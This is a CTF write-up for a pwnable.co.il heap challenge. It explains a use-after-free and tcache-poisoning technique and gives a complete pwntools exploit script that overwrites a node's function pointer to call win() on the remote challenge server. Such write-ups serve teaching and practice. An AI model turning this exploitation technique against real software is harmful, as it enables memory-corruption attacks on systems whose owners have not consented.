# pwnable solves
writeups for **some** of the pwnable.kr challenges i solved. theres a branch opened for each pwn
# pwnable.co.il - objective
the program is basically supposed to create a linked list. it has three functions for this: creating a node, which allocates memory using glibc malloc and also allocates the nodes data on the heap, editing an object, which allows changing the value of its data and deleting an object.

there are several vulnerabilities:

1. the object deletion function only frees the data, not the Node itself.
2. It is possible to edit the data of a Node even after it has been deleted.

# idea:
when an object is freed in modern glibc and its size is smaller than 0x420, it is inserted into a tcache bin, assuming there is available space in the tcache. If there are multiple chunks in the same tcache bin, they are connected with pointers and form a linked list. if I can change the pointer of one of the bins to a location of my choice, the next malloc will write to that location.

the place i want to write to is inside the data of the Node, because it holds a function pointer to the print function, which i can call if i overwrite it. to change the pointer, i can use the edit function.

another issue is that because of ASLR, i will not know where to jump. To solve this, I can free one of the Nodes and create a new Node. Because of the tcache allocation algorithm, the new node will receive the data chunk of the previous node, which contains the pointer to the next node. i can print the data that contains this pointer and thereby leak a heap address, then calculate the offset from it.

## Exploit:

I created four nodes. then I freed the last three. there was a bug that prevented freeing the first one. I created a new node and used it to leak the heap address through the pointer stored in the data, as explained earlier.

at this point, there were still four nodes and two chunks in the tcache. I could access both of them using the edit function. I used the edit function to overwrite the tcache pointer with the address where the function pointer of the first Node is stored, based on the calculated offset.

then I allocated another node and set its data to the address of the win() function. this address was written into the function pointer. finally, I used the print function, which called win().

```py
from pwn import *
import re
OFFSET = 80
HEAP_BASE_OFFSET = 134272
WIN_ADDR = p64(0x401296)

def alocObj(data):
    p.sendline(b"1")
    p.sendline(b"3")
    if data == "":
        p.sendline(data)
    else:
        p.sendline(data)

def delObj(objNum):
    p.sendline(b"3")
    p.sendline(objNum)

def editObj(objNum, data):
    p.send(b"2\n")
    p.sendline(objNum)
    p.sendline(data)


def extract_number_after_2(data):
    prefixes = (b"\n2.", b"\r\n2.")
    best_pos = -1

    # find the last occurrence in the possible newline styles
    for p in prefixes:
        pos = data.rfind(p)
        if pos > best_pos:
            best_pos = pos

    # if not found also allow start of buffer "2."
    if best_pos == -1:
        if data.startswith(b"2."):
            best_pos = 0
        else:
            raise ValueError("could not find a '2.' line")

    # we might have matched a menu "2. Edit object" etc.
    # So scan backwards to find a '2.' that is followed (after spaces) by digits.
    i = best_pos
    while i != -1:
        # move to after "2."
        j = i + 2

        # skip optional dot and whitespace: handles "2." and "2.   "
        if j < len(data) and data[j] == 46:  # '.'
            j += 1
        while j < len(data) and data[j] in (9, 10, 13, 32):  # \t \n \r space
            j += 1

        # if digits start here, parse number
        if j < len(data) and 48 <= data[j] <= 57:
            n = 0
            while j < len(data) and 48 <= data[j] <= 57:
                n = n * 10 + (data[j] - 48)
                j += 1
            return n

        # otherwise find previous occurrence of either newline style '2.'
        prev_n = data.rfind(b"\n2.", 0, i)
        prev_rn = data.rfind(b"\r\n2.", 0, i)
        i = prev_n if prev_n > prev_rn else prev_rn

    raise ValueError("no digits after any '2.' marker")

p = remote("pwnable.co.il", 9004)
#p = process("./obj", stdin=PIPE)
#gdb.attach(p)
# make a 4 node linked list
alocObj(8 * b"1")
alocObj(8 * b"2")
alocObj(8 * b"3")
alocObj(8 * b"4")
# delete the third object
delObj("3")
delObj("2")
delObj("1")

alocObj("")
#sleep(3)
# clear pipe
#p.recv()
sleep(3)


# leak addresses
p.sendline(b"4") 
sleep(3)
data = p.recv()
#data=data.splitlines()
print(data)
pause()
heap_leak = extract_number_after_2(data) - 0X0a
print(f" leak: {hex(heap_leak)}")
writeto_addr = heap_leak - OFFSET
print(f" {hex(writeto_addr)}, {(heap_leak - writeto_addr)}, {p64(writeto_addr)}")
editObj(b"2", p64(writeto_addr))
alocObj(b"BBBBBBBB")
alocObj(WIN_ADDR)
p.sendline(b"4")
#pause()
p.interactive()
``
